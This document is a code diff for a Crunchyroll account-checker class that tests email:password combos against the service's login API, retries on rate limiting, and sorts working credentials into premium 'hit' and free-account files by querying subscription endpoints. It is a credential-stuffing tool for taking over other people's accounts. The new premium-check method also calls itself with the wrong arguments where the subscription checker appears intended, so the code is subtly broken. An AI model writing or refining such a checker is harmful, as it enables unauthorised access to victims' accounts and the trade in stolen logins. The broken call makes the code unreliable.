@@ -65,33 +65,13 @@ class CrunchyrollChecker:
             headers = headers,
             data = data
         )
-        try:
-            self.res = request.urlopen(req)
-        except error.HTTPError as e:
-            if e.code == 401:
-                print(f'{self.email}:{self.password} Wrong!')
-            elif e.code == 429:
-                print("Too many Requests, Let me take a sleep for 10 seconds.")
-                time.sleep(10)
-                self._tryToLogin()
-            else:
-                print(e)
-            self._resultSaving()
-        except Exception as e:
-            print(e)
-            self._resultSaving()
-        else:
-            self.res = self.res.read()
-            self.res = self.res.decode('utf-8')
-            self.res = json.loads(self.res)
-            if self.res['access_token']:
-                print(f'{self.email}:{self.password} Hit Found!')
-                # print(self.res)
-                self._resultSaving(result = True)
-            else:
-                print(f'{self.email}:{self.password} Something went wrong!')
-                print(self.res)
-                self._resultSaving()
+        return req
+
+    def _parseResponse(self, res):
+        res = res.read()
+        res = res.decode('utf-8')
+        res = json.loads(res)
+        return res
     
     def _tryToLogin(self):
         data = dict(self.data)
@@ -99,11 +79,42 @@ class CrunchyrollChecker:
         data['password'] = self.password
         headers = dict(self.headers)
         headers["authorization"] = self.auth
-        self._makeRequest(
+        req = self._makeRequest(
             self.apiUrl + "auth/v1/token",
             headers,
             data
         )
+        try:
+            res = request.urlopen(req)
+        except error.HTTPError as e:
+            if e.code == 401:
+                print(f'{self.email}:{self.password} Wrong!')
+            elif e.code == 429:
+                print("Too many Requests, Let me take a sleep for 10 seconds.")
+                time.sleep(10)
+                self._tryToLogin()
+                return
+            else:
+                print(e)
+            self._resultSaving()
+        except Exception as e:
+            print(e)
+            self._resultSaving()
+        else:
+            resData = self._parseResponse(res)
+            try:
+                accessToken = resData['access_token']
+            except KeyError:
+                print(f'{self.email}:{self.password} Something went wrong!')
+                print(resData)
+                self._resultSaving()
+            else:
+                if accessToken:
+                    self._premiumChecker(accessToken)
+                else:
+                    print(f'{self.email}:{self.password} Something went wrong!')
+                    print(resData)
+                    self._resultSaving()
     
     def _filterEmailPass(self, line):
         loginDetail = re.findall(regexEmailPassCombo, line)
@@ -116,13 +127,58 @@ class CrunchyrollChecker:
     def _resultFile(self):
         resultDir = 'result//'
         self.hitFile = open(f'{resultDir}hit.txt', 'a')
+        self.freeFile = open(f'{resultDir}free.txt', 'a')
         self.invalid = open(f'{resultDir}invalid.txt', 'a')
 
-    def _resultSaving(self, result = None):
-        if result:
+    def _resultSaving(self, file = 'invalid'):
+        if file == 'invalid':
+            self.invalid.write(f'{self.email}:{self.password}' + '\n')
+            self.invalid.flush()
+        elif file == 'hit':
             self.hitFile.write(f'{self.email}:{self.password}' + '\n')
             self.hitFile.flush()
         else:
-            self.invalid.write(f'{self.email}:{self.password}' + '\n')
-            self.invalid.flush()
+            self.freeFile.write(f'{self.email}:{self.password}' + '\n')
+            self.freeFile.flush()
+    
+    def _premiumChecker(self, accessToken):
+        header = {
+            "authorization" : f"Bearer {accessToken}"
+        }
+        externalID = self._getExternalID(header)
+        if externalID:
+            self._premiumChecker(header, externalID)
+        return
+
+    def _getExternalID(self, header):
+        req = self._makeRequest(
+            self.apiUrl + 'accounts/v1/me',
+            headers = header
+        )
+        res = request.urlopen(req)
+        resData = self._parseResponse(res)
+        try:
+            externalID = resData['external_id']
+        except KeyError:
+            print(f'{self.email}:{self.password} Something went wrong! While getting externalID')
+            print(resData)
+            self._resultSaving(file = 'free')
+            return
+        else:
+            return externalID
+
+    def _subscriptionChecker(self, header, externalID):
+        req = self._makeRequest(
+            self.apiUrl + f'subs/v1/subscriptions/{externalID}/products',
+            headers = header
+        )
+        res = request.urlopen(req)
+        resData = self._parseResponse(res)
+        if resData['total']:
+            print(f'{self.email}:{self.password} Hit Found!')
+            self._resultSaving(file = 'hit')
+        else:
+            print(f'{self.email}:{self.password} Free Account Found!')
+            self._resultSaving(file = 'free')
+        print(resData)
 
